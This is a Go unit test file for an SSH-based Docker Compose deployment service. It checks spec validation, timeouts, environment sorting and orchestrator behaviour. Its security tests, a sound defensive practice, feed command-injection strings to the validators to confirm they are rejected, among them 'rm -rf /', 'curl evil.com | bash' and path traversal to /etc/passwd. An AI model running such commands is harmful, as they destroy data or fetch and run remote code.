package services

import (
	"context"
	"sort"
	"strings"
	"testing"
	"time"
)

// TestDeploymentSpecValidate tests the validation logic for DeploymentSpec
func TestDeploymentSpecValidate(t *testing.T) {
	tests := []struct {
		name    string
		spec    DeploymentSpec
		wantErr bool
		errMsg  string
	}{
		{
			name: "valid spec",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'\nservices:\n  app:\n    image: nginx",
				Timeout:        10 * time.Minute,
			},
			wantErr: false,
		},
		{
			name: "missing host",
			spec: DeploymentSpec{
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "host cannot be empty",
		},
		{
			name: "missing stack name",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "stack name cannot be empty",
		},
		{
			name: "missing deploy directory",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "deploy directory cannot be empty",
		},
		{
			name: "missing compose content",
			spec: DeploymentSpec{
				Host:      "192.168.1.10:22",
				StackName: "test-stack",
				DeployDir: "/home/user/deployments/test",
			},
			wantErr: true,
			errMsg:  "compose content cannot be empty",
		},
		{
			name: "valid spec with environment",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
				Environment: map[string]string{
					"DB_HOST": "localhost",
					"DB_PORT": "5432",
				},
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.spec.Validate()
			if tt.wantErr {
				if err == nil {
					t.Errorf("Validate() expected error but got nil")
					return
				}
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("Validate() error = %v, want error containing %q", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("Validate() unexpected error = %v", err)
				}
			}
		})
	}
}

// TestCheckContextCancelled tests the context cancellation helper
func TestCheckContextCancelled(t *testing.T) {
	tests := []struct {
		name    string
		ctx     func() context.Context
		wantErr bool
	}{
		{
			name: "active context",
			ctx: func() context.Context {
				return context.Background()
			},
			wantErr: false,
		},
		{
			name: "cancelled context",
			ctx: func() context.Context {
				ctx, cancel := context.WithCancel(context.Background())
				cancel()
				return ctx
			},
			wantErr: true,
		},
		{
			name: "timeout context expired",
			ctx: func() context.Context {
				ctx, cancel := context.WithTimeout(context.Background(), 1*time.Nanosecond)
				defer cancel()
				time.Sleep(10 * time.Millisecond) // Ensure timeout expires
				return ctx
			},
			wantErr: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := checkContextCancelled(tt.ctx())
			if tt.wantErr && err == nil {
				t.Errorf("checkContextCancelled() expected error but got nil")
			}
			if !tt.wantErr && err != nil {
				t.Errorf("checkContextCancelled() unexpected error = %v", err)
			}
		})
	}
}

// TestOrchestratorConfigFactory tests orchestrator instantiation
func TestNewOrchestrator(t *testing.T) {
	tests := []struct {
		name         string
		config       OrchestratorConfig
		expectedMode string
	}{
		{
			name: "compose mode",
			config: OrchestratorConfig{
				Mode:         "compose",
				SwarmEnabled: false,
			},
			expectedMode: "compose",
		},
		{
			name: "swarm mode (fallback to compose)",
			config: OrchestratorConfig{
				Mode:         "swarm",
				SwarmEnabled: true,
			},
			expectedMode: "compose", // Falls back since swarm not implemented
		},
		{
			name: "default mode",
			config: OrchestratorConfig{
				Mode:         "",
				SwarmEnabled: false,
			},
			expectedMode: "compose",
		},
		{
			name: "unknown mode",
			config: OrchestratorConfig{
				Mode:         "unknown",
				SwarmEnabled: false,
			},
			expectedMode: "compose", // Falls back to default
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			orchestrator := NewOrchestrator(tt.config, nil)
			if orchestrator == nil {
				t.Fatalf("NewOrchestrator() returned nil")
			}

			mode := orchestrator.GetMode()
			if mode != tt.expectedMode {
				t.Errorf("GetMode() = %q, want %q", mode, tt.expectedMode)
			}
		})
	}
}

// TestEnvironmentVariableSorting tests that environment variables are written in deterministic order
func TestEnvironmentVariableSorting(t *testing.T) {
	env := map[string]string{
		"ZEBRA": "last",
		"APPLE": "first",
		"MANGO": "middle",
	}

	// Simulate the sorting logic from Deploy method
	keys := make([]string, 0, len(env))
	for k := range env {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	expected := []string{"APPLE", "MANGO", "ZEBRA"}
	for i, key := range keys {
		if key != expected[i] {
			t.Errorf("keys[%d] = %q, want %q", i, key, expected[i])
		}
	}

	// Build content as done in actual code
	envContent := ""
	for _, key := range keys {
		envContent += key + "=" + env[key] + "\n"
	}

	expectedContent := "APPLE=first\nMANGO=middle\nZEBRA=last\n"
	if envContent != expectedContent {
		t.Errorf("envContent = %q, want %q", envContent, expectedContent)
	}
}

// TestHealthStatus tests the health status struct
func TestHealthStatus(t *testing.T) {
	now := time.Now()
	status := HealthStatus{
		Healthy:   true,
		Running:   true,
		Message:   "Container is healthy",
		Timestamp: now,
	}

	if !status.Healthy {
		t.Errorf("Expected Healthy to be true")
	}
	if !status.Running {
		t.Errorf("Expected Running to be true")
	}
	if status.Message != "Container is healthy" {
		t.Errorf("Message = %q, want %q", status.Message, "Container is healthy")
	}
	if !status.Timestamp.Equal(now) {
		t.Errorf("Timestamp mismatch")
	}
}

// TestRemovalSpec tests removal spec construction
func TestRemovalSpec(t *testing.T) {
	spec := RemovalSpec{
		Host:           "192.168.1.10:22",
		StackName:      "test-stack",
		DeployDir:      "/home/user/deployments/test",
		ContainerName:  "test-container",
		IncludeVolumes: true,
	}

	if spec.Host != "192.168.1.10:22" {
		t.Errorf("Host = %q, want %q", spec.Host, "192.168.1.10:22")
	}
	if spec.StackName != "test-stack" {
		t.Errorf("StackName = %q, want %q", spec.StackName, "test-stack")
	}
	if !spec.IncludeVolumes {
		t.Errorf("Expected IncludeVolumes to be true")
	}
}

// TestDeploymentSpecDefaults tests default timeout behavior
func TestDeploymentSpecDefaults(t *testing.T) {
	spec := DeploymentSpec{
		Host:           "192.168.1.10:22",
		StackName:      "test-stack",
		DeployDir:      "/home/user/deployments/test",
		ComposeContent: "version: '3.8'",
		Timeout:        0, // No timeout set
	}

	// Timeout should be 0 initially
	if spec.Timeout != 0 {
		t.Errorf("Initial Timeout = %v, want 0", spec.Timeout)
	}

	// The Deploy method should set it to 10 minutes if 0
	// We're testing the contract here
	expectedTimeout := 10 * time.Minute
	if spec.Timeout == 0 {
		spec.Timeout = expectedTimeout
	}

	if spec.Timeout != expectedTimeout {
		t.Errorf("After default, Timeout = %v, want %v", spec.Timeout, expectedTimeout)
	}
}

// TestContextAwareOperations tests that operations respect context cancellation
func TestContextAwareOperations(t *testing.T) {
	t.Run("context cancellation detected immediately", func(t *testing.T) {
		ctx, cancel := context.WithCancel(context.Background())
		cancel() // Cancel immediately

		err := checkContextCancelled(ctx)
		if err == nil {
			t.Error("Expected error from cancelled context")
		}

		if !strings.Contains(err.Error(), "context canceled") {
			t.Errorf("Error message should mention context cancellation, got: %v", err)
		}
	})

	t.Run("context cancellation with timeout", func(t *testing.T) {
		ctx, cancel := context.WithTimeout(context.Background(), 1*time.Nanosecond)
		defer cancel()

		time.Sleep(10 * time.Millisecond) // Wait for timeout

		err := checkContextCancelled(ctx)
		if err == nil {
			t.Error("Expected error from timed out context")
		}
	})

	t.Run("active context passes check", func(t *testing.T) {
		ctx := context.Background()

		err := checkContextCancelled(ctx)
		if err != nil {
			t.Errorf("Unexpected error from active context: %v", err)
		}
	})
}

// TestOrchestratorMode tests GetMode method
func TestOrchestratorMode(t *testing.T) {
	config := OrchestratorConfig{
		Mode:         "compose",
		SwarmEnabled: false,
	}

	orchestrator := NewOrchestrator(config, nil)
	mode := orchestrator.GetMode()

	if mode != "compose" {
		t.Errorf("GetMode() = %q, want %q", mode, "compose")
	}
}

// TestDeploymentSpecWithLargeEnvironment tests handling of many environment variables
func TestDeploymentSpecWithLargeEnvironment(t *testing.T) {
	spec := DeploymentSpec{
		Host:           "192.168.1.10:22",
		StackName:      "test-stack",
		DeployDir:      "/home/user/deployments/test",
		ComposeContent: "version: '3.8'",
		Environment:    make(map[string]string),
	}

	// Add 100 environment variables
	for i := 0; i < 100; i++ {
		key := strings.Repeat("A", i%26+1) + string(rune('A'+i%26))
		spec.Environment[key] = "value" + string(rune('0'+i%10))
	}

	// Should still validate
	err := spec.Validate()
	if err != nil {
		t.Errorf("Validate() with large environment failed: %v", err)
	}

	// Test that keys are sorted
	keys := make([]string, 0, len(spec.Environment))
	for k := range spec.Environment {
		keys = append(keys, k)
	}
	sort.Strings(keys)

	// Verify sorted order
	for i := 1; i < len(keys); i++ {
		if keys[i-1] >= keys[i] {
			t.Errorf("Keys not properly sorted: %q >= %q", keys[i-1], keys[i])
		}
	}
}

// TestDeploymentSpecSecurityValidation tests that malicious inputs are rejected
func TestDeploymentSpecSecurityValidation(t *testing.T) {
	tests := []struct {
		name    string
		spec    DeploymentSpec
		wantErr bool
		errMsg  string
	}{
		{
			name: "malicious stack name with semicolon",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test; rm -rf /",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name: "stack name with spaces",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name: "deploy dir with command injection",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/tmp/test; curl evil.com | bash",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "invalid or dangerous",
		},
		{
			name: "deploy dir with path traversal",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/home/user/../../../etc/passwd",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "invalid or dangerous",
		},
		{
			name: "deploy dir with tilde",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "~/deployments/test",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "invalid or dangerous",
		},
		{
			name: "negative timeout",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
				Timeout:        -5 * time.Second,
			},
			wantErr: true,
			errMsg:  "timeout cannot be negative",
		},
		{
			name: "invalid host missing port",
			spec: DeploymentSpec{
				Host:           "192.168.1.10",
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
			},
			wantErr: true,
			errMsg:  "host:port",
		},
		{
			name: "invalid env var name",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
				Environment: map[string]string{
					"VALID_VAR":   "value1",
					"invalid-var": "value2", // hyphens not allowed in env var names
				},
			},
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name: "invalid env var value with null byte",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
				Environment: map[string]string{
					"VALID_VAR": "value\x00with_null",
				},
			},
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name: "invalid env var value too long",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
				Environment: map[string]string{
					"LARGE_VAR": strings.Repeat("a", 70000),
				},
			},
			wantErr: true,
			errMsg:  "invalid",
		},
		{
			name: "valid stack name with hyphens and underscores",
			spec: DeploymentSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack_123",
				DeployDir:      "/home/user/deployments/test",
				ComposeContent: "version: '3.8'",
			},
			wantErr: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.spec.Validate()
			if tt.wantErr {
				if err == nil {
					t.Errorf("Validate() expected error but got nil")
					return
				}
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("Validate() error = %v, want error containing %q", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("Validate() unexpected error = %v", err)
				}
			}
		})
	}
}

// TestValidationHelpers tests the security validation helper functions
func TestValidationHelpers(t *testing.T) {
	t.Run("isValidHost", func(t *testing.T) {
		tests := []struct {
			name  string
			input string
			valid bool
		}{
			{"valid IP with port", "192.168.1.10:22", true},
			{"valid hostname with port", "example.com:22", true},
			{"valid localhost with port", "localhost:2222", true},
			{"invalid missing port", "192.168.1.10", false},
			{"invalid missing host", ":22", false},
			{"invalid empty", "", false},
			{"invalid multiple colons", "192.168.1.10:22:33", false},
			{"invalid non-numeric port", "192.168.1.10:abc", false},
			{"invalid too long", strings.Repeat("a", 256) + ":22", false},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				result := isValidHost(tt.input)
				if result != tt.valid {
					t.Errorf("isValidHost(%q) = %v, want %v", tt.input, result, tt.valid)
				}
			})
		}
	})

	t.Run("isValidStackName", func(t *testing.T) {
		tests := []struct {
			name  string
			input string
			valid bool
		}{
			{"valid alphanumeric", "test123", true},
			{"valid with hyphens", "test-stack", true},
			{"valid with underscores", "test_stack", true},
			{"valid mixed", "test-stack_123", true},
			{"invalid with spaces", "test stack", false},
			{"invalid with semicolon", "test;stack", false},
			{"invalid with slash", "test/stack", false},
			{"invalid empty", "", false},
			{"invalid too long", strings.Repeat("a", 256), false},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				result := isValidStackName(tt.input)
				if result != tt.valid {
					t.Errorf("isValidStackName(%q) = %v, want %v", tt.input, result, tt.valid)
				}
			})
		}
	})

	t.Run("isValidDeployPath", func(t *testing.T) {
		tests := []struct {
			name  string
			input string
			valid bool
		}{
			{"valid absolute path", "/home/user/deployments", true},
			{"valid relative path", "deployments/test", true},
			{"valid with dots in filename", "/home/user/app.production", true},
			{"invalid with tilde prefix", "~/deployments/test", false},
			{"invalid with tilde in middle", "/home/~user/test", false},
			{"invalid with semicolon", "/tmp; rm -rf /", false},
			{"invalid with pipe", "/tmp | curl evil.com", false},
			{"invalid with path traversal", "/home/../../../etc", false},
			{"invalid with backtick", "/tmp/`whoami`", false},
			{"invalid with dollar sign", "/tmp/$USER", false},
			{"invalid with space", "/tmp/my path", false},
			{"invalid empty", "", false},
			{"invalid too long", "/" + strings.Repeat("a", 5000), false},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				result := isValidDeployPath(tt.input)
				if result != tt.valid {
					t.Errorf("isValidDeployPath(%q) = %v, want %v", tt.input, result, tt.valid)
				}
			})
		}
	})

	t.Run("isValidEnvVarName", func(t *testing.T) {
		tests := []struct {
			name  string
			input string
			valid bool
		}{
			{"valid uppercase", "MY_VAR", true},
			{"valid with underscores", "MY_LONG_VAR_NAME", true},
			{"valid starting with underscore", "_PRIVATE_VAR", true},
			{"valid mixed case", "MyVar", true},
			{"invalid with hyphen", "MY-VAR", false},
			{"invalid starting with number", "1VAR", false},
			{"invalid with space", "MY VAR", false},
			{"invalid with special char", "MY$VAR", false},
			{"invalid empty", "", false},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				result := isValidEnvVarName(tt.input)
				if result != tt.valid {
					t.Errorf("isValidEnvVarName(%q) = %v, want %v", tt.input, result, tt.valid)
				}
			})
		}
	})

	t.Run("isValidEnvVarValue", func(t *testing.T) {
		tests := []struct {
			name  string
			input string
			valid bool
		}{
			{"valid simple string", "hello", true},
			{"valid with spaces", "hello world", true},
			{"valid with newlines", "line1\nline2\nline3", true},
			{"valid with tabs", "col1\tcol2\tcol3", true},
			{"valid with special chars", "!@#$%^&*()[]{}+=-", true},
			{"valid long string", strings.Repeat("a", 65536), true},
			{"invalid with null byte", "hello\x00world", false},
			{"invalid with control char", "hello\x01world", false},
			{"invalid too long", strings.Repeat("a", 65537), false},
			{"valid empty", "", true},
		}

		for _, tt := range tests {
			t.Run(tt.name, func(t *testing.T) {
				result := isValidEnvVarValue(tt.input)
				if result != tt.valid {
					t.Errorf("isValidEnvVarValue(%q) = %v, want %v", tt.input, result, tt.valid)
				}
			})
		}
	})
}

// TestRemovalSpecValidation tests RemovalSpec validation
func TestRemovalSpecValidation(t *testing.T) {
	tests := []struct {
		name    string
		spec    RemovalSpec
		wantErr bool
		errMsg  string
	}{
		{
			name: "valid removal spec",
			spec: RemovalSpec{
				Host:           "192.168.1.10:22",
				StackName:      "test-stack",
				DeployDir:      "/home/user/deployments/test",
				ContainerName:  "test-container",
				IncludeVolumes: true,
			},
			wantErr: false,
		},
		{
			name: "valid minimal removal spec",
			spec: RemovalSpec{
				Host:      "192.168.1.10:22",
				StackName: "test-stack",
			},
			wantErr: false,
		},
		{
			name: "missing host",
			spec: RemovalSpec{
				StackName: "test-stack",
			},
			wantErr: true,
			errMsg:  "host cannot be empty",
		},
		{
			name: "invalid host format",
			spec: RemovalSpec{
				Host:      "192.168.1.10",
				StackName: "test-stack",
			},
			wantErr: true,
			errMsg:  "host:port",
		},
		{
			name: "missing stack name",
			spec: RemovalSpec{
				Host: "192.168.1.10:22",
			},
			wantErr: true,
			errMsg:  "stack name cannot be empty",
		},
		{
			name: "invalid stack name",
			spec: RemovalSpec{
				Host:      "192.168.1.10:22",
				StackName: "test; rm -rf /",
			},
			wantErr: true,
			errMsg:  "invalid characters",
		},
		{
			name: "invalid deploy dir",
			spec: RemovalSpec{
				Host:      "192.168.1.10:22",
				StackName: "test-stack",
				DeployDir: "/tmp; echo hacked",
			},
			wantErr: true,
			errMsg:  "invalid or dangerous",
		},
		{
			name: "invalid container name",
			spec: RemovalSpec{
				Host:          "192.168.1.10:22",
				StackName:     "test-stack",
				ContainerName: "container; rm -rf /",
			},
			wantErr: true,
			errMsg:  "invalid characters",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			err := tt.spec.Validate()
			if tt.wantErr {
				if err == nil {
					t.Errorf("Validate() expected error but got nil")
					return
				}
				if !strings.Contains(err.Error(), tt.errMsg) {
					t.Errorf("Validate() error = %v, want error containing %q", err, tt.errMsg)
				}
			} else {
				if err != nil {
					t.Errorf("Validate() unexpected error = %v", err)
				}
			}
		})
	}
}

// TestNilSSHClientHandling tests that nil SSH client is handled gracefully
func TestNilSSHClientHandling(t *testing.T) {
	orchestrator := NewDockerComposeOrchestrator(nil)

	spec := DeploymentSpec{
		Host:           "192.168.1.10:22",
		StackName:      "test-stack",
		DeployDir:      "/home/user/deployments/test",
		ComposeContent: "version: '3.8'",
	}

	ctx := context.Background()

	// Deploy should fail with clear error
	err := orchestrator.Deploy(ctx, spec)
	if err == nil {
		t.Error("Deploy() with nil SSH client should return error")
	}
	if !strings.Contains(err.Error(), "SSH client is nil") {
		t.Errorf("Deploy() error should mention nil SSH client, got: %v", err)
	}

	// HealthCheck should fail with clear error
	_, err = orchestrator.HealthCheck(ctx, "test-stack", "192.168.1.10:22")
	if err == nil {
		t.Error("HealthCheck() with nil SSH client should return error")
	}
	if !strings.Contains(err.Error(), "SSH client is nil") {
		t.Errorf("HealthCheck() error should mention nil SSH client, got: %v", err)
	}

	// Remove should fail with clear error
	err = orchestrator.Remove(ctx, "test-stack", "192.168.1.10:22", false)
	if err == nil {
		t.Error("Remove() with nil SSH client should return error")
	}
	if !strings.Contains(err.Error(), "SSH client is nil") {
		t.Errorf("Remove() error should mention nil SSH client, got: %v", err)
	}

	// WaitForHealthy should fail with clear error
	err = orchestrator.WaitForHealthy(ctx, "test-stack", "192.168.1.10:22", 1*time.Minute)
	if err == nil {
		t.Error("WaitForHealthy() with nil SSH client should return error")
	}
	if !strings.Contains(err.Error(), "SSH client is nil") {
		t.Errorf("WaitForHealthy() error should mention nil SSH client, got: %v", err)
	}
}
